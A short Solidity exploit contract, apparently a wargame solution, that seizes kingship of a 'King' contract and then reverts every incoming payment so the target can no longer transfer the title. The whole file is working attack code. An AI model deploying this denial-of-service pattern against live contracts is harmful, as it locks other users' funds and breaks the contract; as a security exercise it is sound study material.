// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        uint256 prize = King(payable(contractAddress)).prize();
        (bool success,) = payable(contractAddress).call{value: prize + 1, gas: 50000}("");
        require(success, "CALL_FAILED");
    }

    // Fails on transfer
    fallback() external payable {
        revert("hehe u no transfer");
    }
}
